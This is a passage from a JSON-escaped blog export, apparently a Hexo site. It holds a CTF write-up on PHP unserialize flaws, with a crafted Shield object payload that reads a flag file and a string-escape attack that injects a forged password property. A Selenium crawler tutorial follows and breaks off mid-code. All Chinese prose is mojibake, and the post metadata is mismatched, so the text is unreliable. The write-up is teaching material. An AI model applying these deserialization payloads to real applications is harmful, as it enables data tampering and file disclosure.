stripos($this-&gt;file,&apos;..&apos;)===FALSE  \n        &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\\\&apos;)==FALSE) {\n            return @file_get_contents($this-&gt;file);\n        }\n    }\n}\n?&gt;</code></pre><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°index.phpä¸­å…ˆåŒ…å«äº†shield.phpï¼Œç„¶ååˆ›å»ºäº†ä¸€ä¸ªæ–°å¯¹è±¡ï¼Œåœ¨åˆ¤æ–­å®Œgetçš„å˜é‡ä¹‹åè¿›è¡Œååºåˆ—åŒ–ï¼Œéšåè°ƒç”¨readfile()å‡½æ•°ã€‚<br>åœ¨shield.phpä¸­æç¤ºflagåœ¨pctf.phpä¸­ï¼Œéšååœ¨readfile()å‡½æ•°ä¸­å¯¹$fileè¿›è¡Œä¸€å®šè¿‡æ»¤ä¹‹åè¯»æ–‡ä»¶å†…å®¹ã€‚</p>\n<p>æˆ‘ä»¬çš„æƒ³æ³•å°±æ˜¯æ§åˆ¶$fileçš„å€¼ä¸ºpctf.php</p>\n<pre><code>&lt;?php\n//flag is in pctf.php\nclass Shield {\n    public $file;\n    function __construct($filename = &apos;&apos;) {\n        $this -&gt; file = $filename;\n    }\n    function readfile() {\n        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  \n        &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\\\&apos;)==FALSE) {\n            return @file_get_contents($this-&gt;file);\n        }\n    }\n}\n$a = new Shield(&quot;pctf.php&quot;);\necho serialize($a);\n?&gt;\nåºåˆ—åŒ–ç»“æœ\nO:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥å°è¯•ä¼ å…¥è¿™ä¸ªå­—ç¬¦ä¸²</p>\n<pre><code>class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>å°±å¯ä»¥åœ¨æºç ä¸­çœ‹åˆ°flag.</p>\n<p><img src=\"https://i.imgur.com/rAYet4u.png\" alt></p>\n<h2 id=\"ROP-Return-Oriented-programming-é“¾\"><a href=\"#ROP-Return-Oriented-programming-é“¾\" class=\"headerlink\" title=\"ROP(Return-Oriented programming)é“¾\"></a>ROP(Return-Oriented programming)é“¾</h2><p>è¿™é“é¢˜çš„æ”»å‡»é“¾æ¯”è¾ƒç®€å•ã€‚å½“æˆ‘ä»¬ä¼ å…¥åºåˆ—åŒ–å®Œæˆçš„å­—ç¬¦ä¸²åï¼Œç¨‹åºå…ˆå¯¹å…¶ååºåˆ—åŒ–ç”Ÿæˆä¸€ä¸ªå¯¹è±¡ï¼Œè¿™æ—¶æ²¡æœ‰_wakeup()ï¼Œ_destruct()é­”æ³•å‡½æ•°ï¼Œåªæ˜¯ç®€å•çš„ååºåˆ—åŒ–ï¼Œä¹‹åè°ƒç”¨readfile()å‡½æ•°è¿›è¡Œ$fileçš„å†…å®¹çš„è¯»å–ï¼Œè€Œæˆ‘ä»¬å°†$fileçš„å€¼è®¾ç½®ä¸ºäº†pctf.phpï¼Œäºæ˜¯æˆ‘ä»¬å¾—åˆ°äº†è¯¥æ–‡ä»¶çš„å†…å®¹ã€‚<br>ååºåˆ—åŒ–æ¼æ´éœ€è¦ä¸¤ä¸ªæ¡ä»¶ï¼š</p>\n<blockquote>\n<p>1.å­˜åœ¨åºåˆ—åŒ–å­—ç¬¦ä¸²çš„å¯æ§åˆ¶ç‚¹æˆ–è€…è¯´æ˜¯è¾“å…¥ç‚¹</p>\n<p>2.å­˜åœ¨å¯ä»¥åˆ©ç”¨çš„é­”æ³•å‡½æ•°</p>\n</blockquote>\n<h2 id=\"ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸\"><a href=\"#ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸\" class=\"headerlink\" title=\"ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸\"></a>ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</h2><p>å½“æˆ‘ä»¬åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­é‡åˆ°è¿‡æ»¤å‡½æ•°ï¼Œè¿™ç§è¿‡æ»¤å¯èƒ½æ˜¯</p>\n<ul>\n<li>è¿‡æ»¤åé•¿åº¦å¢åŠ </li>\n<li>è¿‡æ»¤åé•¿åº¦å‡å°‘</li>\n</ul>\n<p>å½“è¦ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²é•¿åº¦å‘ç”Ÿå˜åŒ–æ—¶ï¼Œå°±å¯èƒ½ä¼šå‡ºç°å­—ç¬¦ä¸²é€ƒé€¸çš„é—®é¢˜ã€‚</p>\n<p>æ¯”å¦‚æˆ‘ç°åœ¨æœ‰å¦‚ä¸‹ä»£ç ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">$username = <span class=\"string\">'luc1fer3'</span>;</span><br><span class=\"line\">$pwd = <span class=\"string\">'admin'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">replace</span><span class=\"params\">($string)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> str_replace(<span class=\"string\">'3'</span>,<span class=\"string\">'22'</span>,$string);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$ser = <span class=\"keyword\">array</span>($username,$pwd);</span><br><span class=\"line\">var_dump(serialize($ser)).<span class=\"string\">\"\\r\\n\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$b = replace(serialize($ser));</span><br><span class=\"line\">var_dump($b).<span class=\"string\">\"\\r\\n\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>æ‰§è¡Œç»“æœï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">string(<span class=\"number\">41</span>) <span class=\"string\">\"a:2:&#123;i:0;s:8:\"</span>luc1fer3<span class=\"string\">\";i:1;s:5:\"</span>admin<span class=\"string\">\";&#125;\"</span></span><br><span class=\"line\">string(<span class=\"number\">42</span>) <span class=\"string\">\"a:2:&#123;i:0;s:8:\"</span>luc1fer22<span class=\"string\">\";i:1;s:5:\"</span>admin<span class=\"string\">\";&#125;\"</span> <span class=\"comment\">//å±æ€§é•¿åº¦ä»ç„¶æ˜¯ 8</span></span><br></pre></td></tr></table></figure>\n\n<p>è¿™æ˜¯é•¿åº¦å¢åŠ çš„æƒ…å†µã€‚ç°åœ¨è€ƒè™‘ä¸€ç§æƒ…å†µï¼šæˆ‘ä»¬è¦æ±‚æ›´æ”¹å¯†ç ä¸º <code>admin888</code> ï¼Œè¯¥æ€ä¹ˆåšï¼Ÿ</p>\n<p>é¦–å…ˆæˆ‘ä»¬çŸ¥é“å¦‚æœå­—ç¬¦ä¸²çš„é•¿åº¦ä¸åºåˆ—åŒ–åçš„å±æ€§é•¿åº¦ä¸åŒï¼Œååºåˆ—åŒ–æ˜¯ä¼šæŠ¥é”™çš„</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$e = <span class=\"string\">'a:2:&#123;i:0;s:8:\"luc1fer3\";i:1;s:4:\"admin\";&#125;'</span>; <span class=\"comment\">//ä¿®æ”¹é•¿åº¦ä¸º4</span></span><br><span class=\"line\">var_dump(unserialize($e));</span><br><span class=\"line\"></span><br><span class=\"line\">PHP Notice:  unserialize(): Error at offset <span class=\"number\">37</span> of <span class=\"number\">41</span> bytes</span><br><span class=\"line\">    bool(<span class=\"keyword\">false</span>)</span><br></pre></td></tr></table></figure>\n\n<p>å¹¶ä¸”ï¼Œphp åœ¨ååºåˆ—åŒ–æ—¶ä¼šæŠŠä¸€äº›å­—ç¬¦å½“ä½œåˆ†éš”ç¬¦ <code>}</code> </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$e = <span class=\"string\">'a:2:&#123;i:0;s:8:\"luc1fer3\";i:1;s:5:\"admin\";&#125;;i:2;s:2:\"ab\";&#125;'</span>; <span class=\"comment\">//è¯†åˆ«åˆ°ç¬¬ä¸€ä¸ª &#125; ä¹‹åå°±è®¤ä¸ºç›®æ ‡å­—ç¬¦ä¸²ç»“æŸï¼Œåé¢çš„ä¼šå¿½ç•¥æ‰ã€‚</span></span><br><span class=\"line\">var_dump(unserialize($e));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">array</span>(<span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">  [<span class=\"number\">0</span>]=&gt;</span><br><span class=\"line\">  string(<span class=\"number\">8</span>) <span class=\"string\">\"luc1fer3\"</span></span><br><span class=\"line\">  [<span class=\"number\">1</span>]=&gt;</span><br><span class=\"line\">  string(<span class=\"number\">5</span>) <span class=\"string\">\"admin\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>äºæ˜¯æˆ‘ä»¬å¯ä»¥æƒ³åˆ°ï¼Œå¦‚æœæˆ‘ä»¬è‡ªå·±æ„é€ ä¸€ä¸ªç‰¹æ®Šçš„å­—ç¬¦ä¸²ï¼Œæ‰‹åŠ¨é—­åˆ <code>}</code> , é‚£æˆ‘ä»¬å°±å¯ä»¥å¼ºè¡Œåœ¨ååºåˆ—åŒ–ä¹‹åå¡å…¥ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±çš„å±æ€§ã€‚</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$new_pwd = <span class=\"string\">'\";i:1;s:8:\"admin888\";&#125;'</span>; <span class=\"comment\">//length = 22 ç¬¬ä¸€ä¸ªåŒå¼•å·ç”¨æ¥é—­åˆ username</span></span><br></pre></td></tr></table></figure>\n\n<p>è€ƒè™‘åˆ°å‰é¢çš„è¿‡æ»¤å‡½æ•°ï¼Œæˆ‘ä»¬çš„è®¡åˆ’æ˜¯è®¾æ³•ä½¿è¿‡æ»¤åçš„é•¿åº¦å¢åŠ ï¼ˆå› ä¸ºç³»åˆ—åŒ–åçš„å­—ç¬¦ä¸²é•¿åº¦å¢åŠ äº†ï¼Œä½†æ˜¯å±æ€§çš„é•¿åº¦å¹¶ä¸å˜ï¼‰ï¼Œè®©åç³»åˆ—åŒ–æ—¶ç³»ç»Ÿè¯»å–çš„æ˜¯è¿‡æ»¤åå¢åŠ çš„æ•°æ®ï¼Œç„¶åæŠŠæ„é€ çš„æ•°æ®å˜æˆæ–°çš„å±æ€§ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'a:2:&#123;i:0;s:51:\"luc1fer3333333333333333333333\";i:1;s:8:\"admin888\";&#125;\";i:1;s:5:\"admin\";&#125;'</span> </span><br><span class=\"line\">    <span class=\"comment\">//æ³¨æ„è¿™é‡Œæˆ‘ä»¬æ ¹æ®æ„é€ çš„å­—ç¬¦ä¸²é•¿åº¦å¢åŠ äº†21ä¸ª3ï¼Œå¯ä»¥çœ‹åˆ°</span></span><br><span class=\"line\">    luc1fer3333333333333333333333<span class=\"string\">\";i:1;s:8:\"</span>admin888<span class=\"string\">\";&#125; </span></span><br><span class=\"line\"><span class=\"string\">    çš„é•¿åº¦æ˜¯ 8+21+22=73</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">'a:2:&#123;i:0;s:51:\"</span>luc1fer22222222222222222222222222222222222222222222<span class=\"string\">\";i:1;s:8:\"</span>admin888<span class=\"string\">\";&#125;\"</span>;i:<span class=\"number\">1</span>;s:<span class=\"number\">5</span>:<span class=\"string\">\"admin\"</span>;&#125;<span class=\"string\">' </span></span><br><span class=\"line\"><span class=\"string\">\t//è¿‡æ»¤å51æ²¡å˜ï¼Œä½†æ˜¯</span></span><br><span class=\"line\"><span class=\"string\">luc1fer22222222222222222222222222222222222222222222\";i:1;s:8:\"admin888\";&#125;å®é™…é•¿åº¦å´å˜æˆäº† 8+21+22+22</span></span><br></pre></td></tr></table></figure>\n\n<p>æ¯å‡ºç°ä¸€ä¸ª 3 å°±æ›¿æ¢æˆ 22 ,é•¿åº¦åŠ  1 ã€‚ æˆ‘ä»¬æ„é€ çš„å­—ç¬¦ä¸²é•¿åº¦æ˜¯ 22 ï¼Œæˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨ 22 ä¸ª(æœ¬æ¥å¸¦çš„æœ‰ä¸€ä¸ªï¼Œæ‰€ä»¥æ·»åŠ 21ä¸ªå°±å¯ä»¥) 3 æ¥ä½¿é•¿åº¦å¢åŠ 22ã€‚</p>\n<p>ä»ä¸Šé¢çš„ä¾‹å­å¯ä»¥çœ‹å‡ºï¼Œè¿‡æ»¤åçš„å±æ€§é•¿åº¦51ï¼Œåœ¨åç³»åˆ—åŒ–çš„æ—¶å€™åˆšå¥½æŠŠæ›¿æ¢åçš„æ•°æ®è¯»å®Œï¼Œæˆ‘ä»¬æ„é€ çš„æ•°æ®é—­åˆäº†åŒå¼•å·å°±é€ƒé€¸å‡ºæ¥å˜æˆæ–°å±æ€§äº†ã€‚åé¢åŸæ¥çš„å±æ€§ä¼šè¢«å¿½ç•¥ã€‚</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$username = <span class=\"string\">'luc1fer3333333333333333333333\";i:1;s:8:\"admin888\";&#125;'</span>;</span><br><span class=\"line\">$pwd = <span class=\"string\">'admin'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">replace</span><span class=\"params\">($string)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> str_replace(<span class=\"string\">'3'</span>,<span class=\"string\">'22'</span>,$string);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$a = replace(serialize($ser));</span><br><span class=\"line\">var_dump($a).<span class=\"string\">\"\\r\\n\"</span>;</span><br><span class=\"line\">var_dump(unserialize($a));</span><br><span class=\"line\"></span><br><span class=\"line\">string(<span class=\"number\">107</span>) <span class=\"string\">\"a:2:&#123;i:0;s:51:\"</span>luc1fer22222222222222222222222222222222222222222222<span class=\"string\">\";i:1;s:8:\"</span>admin888<span class=\"string\">\";&#125;\"</span>;i:<span class=\"number\">1</span>;s:<span class=\"number\">5</span>:<span class=\"string\">\"admin\"</span>;&#125;<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">array(2) &#123;</span></span><br><span class=\"line\"><span class=\"string\">  [0]=&gt;</span></span><br><span class=\"line\"><span class=\"string\">  string(51) \"</span>luc1fer22222222222222222222222222222222222222222222<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">  [1]=&gt;</span></span><br><span class=\"line\"><span class=\"string\">  string(8) \"</span>admin888<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n","text":"åºåˆ—åŒ–ä¸ååºåˆ—åŒ–0x01ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–phpå…è®¸ä¿å­˜ä¸€ä¸ªå¯¹è±¡æ–¹ä¾¿ä»¥åé‡ç”¨ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºåºåˆ—åŒ–ã€‚åœ¨ä¼ é€’å˜é‡çš„è¿‡ç¨‹ä¸­æœ‰å¯èƒ½é‡åˆ°å˜é‡å€¼è·¨è„šæœ¬ä¼ è¾“çš„è¿‡ç¨‹ã€‚æ¯”å¦‚æ–‡ä»¶ç»“æ„æ˜¯è¿™æ ·çš„ï¼š [Figure] ","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"serialize","slug":"serialize","count":4,"path":"api/tags/serialize.json"}]},{"title":"åºåˆ—åŒ–ä¸ååºåˆ—åŒ–","slug":"ä½¿ç”¨Selenium-ç¼–å†™çˆ¬è™«åŠ¨æ€çˆ¬å–ç½‘ç«™è®¾è®¡æ–‡æ¡£","date":"2019-12-12T03:47:20.000Z","updated":"2020-07-26T03:59:38.681Z","comments":true,"path":"api/articles/ä½¿ç”¨Selenium-ç¼–å†™çˆ¬è™«åŠ¨æ€çˆ¬å–ç½‘ç«™è®¾è®¡æ–‡æ¡£.json","excerpt":"","keywords":null,"cover":"F:%5Call_kinds_file%5C%E8%AF%BE%E8%AE%BE%5C%E5%A4%A7%E4%B8%89%E4%B8%8B%5C%E6%96%87%E6%A1%A3%E5%9B%BE%E7%89%87%5C%E7%A0%94%E6%8B%9B%E7%BD%91%E9%A6%96%E9%A1%B5.png","content":"<h1 id=\"ä½¿ç”¨-Selenium-ç¼–å†™çˆ¬è™«åŠ¨æ€çˆ¬å–ç½‘ç«™\"><a href=\"#ä½¿ç”¨-Selenium-ç¼–å†™çˆ¬è™«åŠ¨æ€çˆ¬å–ç½‘ç«™\" class=\"headerlink\" title=\"ä½¿ç”¨ Selenium ç¼–å†™çˆ¬è™«åŠ¨æ€çˆ¬å–ç½‘ç«™\"></a>ä½¿ç”¨ Selenium ç¼–å†™çˆ¬è™«åŠ¨æ€çˆ¬å–ç½‘ç«™</h1><h2 id=\"Intro\"><a href=\"#Intro\" class=\"headerlink\" title=\"Intro\"></a>Intro</h2><p>ä¼ ç»Ÿçš„æµè§ˆå™¨è¯·æ±‚å“åº”æ–¹å¼æ˜¯ï¼šæˆ‘ä»¬åœ¨ä¸€ä¸ªç½‘ç«™ä¸Šç‚¹å‡»äº†ä¸€ä¸ªè¯·æ±‚èµ„æºçš„æŒ‰é’®ï¼Œå°±ä¼šå¯¹æœåŠ¡å™¨å‘èµ·ä¸€æ¬¡è¯·æ±‚ï¼Œç„¶åå“åº”å†è¿”å›åˆ°æµè§ˆå™¨ã€‚è¯¥è¯·æ±‚æ˜¯ä¸€ä¸ªå®Œæ•´çš„ HTML é¡µé¢ï¼Œå› æ­¤å½“æµè§ˆå™¨ç”¨åˆ°æ–°çš„ HTML é¡µé¢é‡ç»˜æ—¶ï¼Œå¯èƒ½ä¼šçœ‹åˆ°é—ªçƒï¼Œè¿™ä¸€æ–¹é¢å¢åŠ äº†æœåŠ¡å™¨çš„å‹åŠ›ï¼ŒåŒæ—¶é™ä½äº†ç”¨æˆ·çš„ä½“éªŒåº¦ã€‚</p>\n<p>Web 2.0 å¾ˆå¤§ç¨‹åº¦ä¸Šæ¶ˆé™¤äº†è¿™ç§çœ‹å¾—è§çš„äº¤äº’ã€‚è™½ç„¶ä»æœ‰è¯·æ±‚å’Œç›¸åº”ï¼Œåªä¸è¿‡éƒ½éšè—åˆ°äº†å¹•åï¼Œä½œä¸ºç”¨æˆ·ï¼Œä½“éªŒæ›´åŠ èˆ’é€‚ã€‚</p>\n<p>å¦‚ä½•å®ç°å‘¢ï¼Ÿæˆ‘ä»¬éœ€è¦å‘é€å’Œè¯·æ±‚çš„æ•°æ®åªåŒ…å«æˆ‘ä»¬éœ€è¦çš„ï¼Œè€Œä¸æ˜¯æ•´ä¸ª HTML é¡µé¢ã€‚è¿™ç§æƒ…å†µä¸‹ Ajax å…è®¸åœ¨ä¸æ›´æ–°æ•´ä¸ª HTML é¡µé¢çš„æƒ…å†µä¸‹å‘é€å’Œæ¥æ”¶æ•°æ®ã€‚</p>\n<h2 id=\"å¦‚ä½•çˆ¬å–åŠ¨æ€åŠ è½½çš„èµ„æºï¼Ÿ\"><a href=\"#å¦‚ä½•çˆ¬å–åŠ¨æ€åŠ è½½çš„èµ„æºï¼Ÿ\" class=\"headerlink\" title=\"å¦‚ä½•çˆ¬å–åŠ¨æ€åŠ è½½çš„èµ„æºï¼Ÿ\"></a>å¦‚ä½•çˆ¬å–åŠ¨æ€åŠ è½½çš„èµ„æºï¼Ÿ</h2><p>è¿™ç§æ–¹å¼æ–¹ä¾¿äº†ç”¨æˆ·ï¼Œå¯æ˜¯å¯¹æˆ‘ä»¬çˆ¬å–ç½‘é¡µå†…å®¹ç¼ºé€ æˆäº†ä¸ä¾¿ã€‚</p>\n<p>ç›¸å¯¹äºä¼ ç»Ÿçš„é™æ€é¡µé¢ï¼Œæˆ‘ä»¬åœ¨çˆ¬å–é¡µé¢å†…å®¹æ—¶åªéœ€è¦ç®€å•çš„è·å–æ•´ä¸ª HTML æ–‡æœ¬ç„¶åå¯¹å…¶ä¸­çš„å†…å®¹è¿›è¡ŒåŒ¹é…ã€æå–å³å¯ã€‚</p>\n<p>å¯¹äºé‡‡ç”¨åŠ¨æ€è®°è½½å†…å®¹çš„ç½‘ç«™æ¥è¯´ï¼Œæˆ‘ä»¬æŸ¥çœ‹ç½‘é¡µæºä»£ç ä¼šå‘ç°è®¸å¤šæˆ‘ä»¬éœ€è¦çš„èµ„æºæ˜¯éœ€è¦åŠ è½½è¯·æ±‚æ‰èƒ½ä»æœåŠ¡å™¨è¿”å›çš„ã€‚</p>\n<h3 id=\"Selenium-amp-PhantomJSç®€ä»‹\"><a href=\"#Selenium-amp-PhantomJSç®€ä»‹\" class=\"headerlink\" title=\"Selenium &amp; PhantomJSç®€ä»‹\"></a>Selenium &amp; PhantomJSç®€ä»‹</h3><p>Selenium æ˜¯ä¸€ä¸ª Web çš„è‡ªåŠ¨åŒ–æµ‹è¯•å·¥å…·ï¼Œæœ€åˆæ˜¯ä¸ºäº†ç½‘ç«™è‡ªåŠ¨åŒ–æµ‹è¯•å¼€å‘çš„ï¼Œ Selenium æµ‹è¯•ç›´æ¥è¿è¡Œåœ¨æµè§ˆå™¨ä¸­ï¼Œå°±åƒçœŸæ­£çš„ç”¨æˆ·åœ¨æ“ä½œä¸€æ ·ã€‚æ”¯æŒçš„æµè§ˆå™¨åŒ…æ‹¬IEï¼ˆ7, 8, 9, 10, 11ï¼‰ï¼ŒMozilla Firefoxï¼ŒSafariï¼ŒGoogle Chromeï¼ŒOperaç­‰ã€‚ä¹ŸåŒ…æ‹¬ PhantomJS ã€‚</p>\n<p>Selenium å¯ä»¥æ ¹æ®æˆ‘ä»¬çš„æŒ‡ä»¤ï¼Œè®©æµè§ˆå™¨è‡ªåŠ¨åŠ è½½é¡µé¢ï¼Œè·å–éœ€è¦çš„æ•°æ®ï¼Œç”šè‡³æ˜¯é¡µé¢æˆªå±ã€‚<br>å®‰è£…ï¼š<code>pip install selenium</code></p>\n<p>å®˜æ–¹æ–‡æ¡£ï¼š<code>http://selenium-python.readthedocs.io/index.html</code></p>\n<p>PhantomJS æ˜¯ä¸€ä¸ªåŸºäº Webkit çš„â€œæ— ç•Œé¢â€( headless )æµè§ˆå™¨ï¼Œå®ƒä¼šæŠŠç½‘ç«™åŠ è½½åˆ°å†…å­˜å¹¶æ‰§è¡Œé¡µé¢ä¸Šçš„ JavaScriptï¼Œå› ä¸ºä¸ä¼šå±•ç¤ºå›¾å½¢ç•Œé¢ï¼Œæ‰€ä»¥è¿è¡Œèµ·æ¥æ¯”å®Œæ•´çš„æµè§ˆå™¨è¦é«˜æ•ˆã€‚</p>\n<p>å¦‚æœæˆ‘ä»¬æŠŠ Selenium å’Œ PhantomJS ç»“åˆåœ¨ä¸€èµ·ï¼Œå°±å¯ä»¥è¿è¡Œä¸€ä¸ªéå¸¸å¼ºå¤§çš„ç½‘ç»œçˆ¬è™«äº†ï¼Œè¿™ä¸ªçˆ¬è™«å¯ä»¥å¤„ç† JavaScriptã€Cookieã€headersï¼Œä»¥åŠä»»ä½•æˆ‘ä»¬çœŸå®ç”¨æˆ·éœ€è¦åšçš„äº‹æƒ…ã€‚</p>\n<p>å®˜æ–¹æ–‡æ¡£ï¼š<code>http://phantomjs.org/documentation</code></p>\n<p>ä¸‹è½½åœ°å€ï¼š <code>http://phantomjs.org/download.html</code></p>\n<p>æ‰‹å†Œï¼š<code>https://phantomjs.org/quick-start.html</code></p>\n<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹å¼æ¥è·å¾—ä¸€ä¸ª <strong>chromedriver</strong> é©±åŠ¨çš„æµè§ˆå™¨(<a href=\"https://sites.google.com/a/chromium.org/chromedriver/home\" target=\"_blank\" rel=\"noopener\">éœ€è¦å®‰è£…å¯¹åº”é©±åŠ¨</a>)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> selenium <span class=\"keyword\">import</span> webdriver</span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium.webdriver.chrome.options <span class=\"keyword\">import</span> Options</span><br><span class=\"line\">chrome_options = Options()</span><br><span class=\"line\">chrome_options.add_argument(<span class=\"string\">\"--headless\"</span>)</span><br><span class=\"line\">chrome_options.add_argument(<span class=\"string\">\"--disable-gpu\"</span>)</span><br><span class=\"line\">driver = webdriver.Chrome(executable_path=<span class=\"string\">\"./chromedriver.exe\"</span>, chrome_options=chrome_options)</span><br></pre></td></tr></table></figure>\n\n<p>å½“ç„¶ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ <strong>PhantomJS</strong> ä½†æ˜¯å­˜åœ¨çš„é—®é¢˜æ˜¯ç”±äºä¸¤ç§é©±åŠ¨è¯·æ±‚é¡µé¢çš„æ–¹å¼ä¸åŒï¼Œåè€…åœ¨é¡µé¢æ²¡æœ‰å®Œå…¨è®°è½½æ—¶å°±ä¼šå°è¯•æ—©æœŸè¯·æ±‚ï¼Œè¿™å¸¸å¸¸ä¼šå¯¼è‡´ <code>InvalidElementStateException</code> é”™è¯¯ï¼Œå½“ç„¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¯·æ±‚é¡µé¢ç¬¬ä¸€ä¸ªå…ƒç´ ä¹‹å‰å°±è°ƒç”¨ <code>time</code> å‡½æ•°ï¼Œè¿›è¡Œ <code>sleep(2)</code> ç­‰å¾…ã€‚</p>\n<p>é™¤æ­¤ä¹‹å¤–ï¼Œ<strong>PhantomJS</strong> ä¹Ÿå·²ç»ä¸å†æ›´æ–°ï¼Œè¿™ä¹Ÿé©±ä½¿æˆ‘ä»¬ä½¿ç”¨æ–°çš„é©±åŠ¨ç¨‹åºã€‚</p>\n<h3 id=\"ç®€å•ä½¿ç”¨\"><a href=\"#ç®€å•ä½¿ç”¨\" class=\"headerlink\" title=\"ç®€å•ä½¿ç”¨\"></a>ç®€å•ä½¿ç”¨</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span 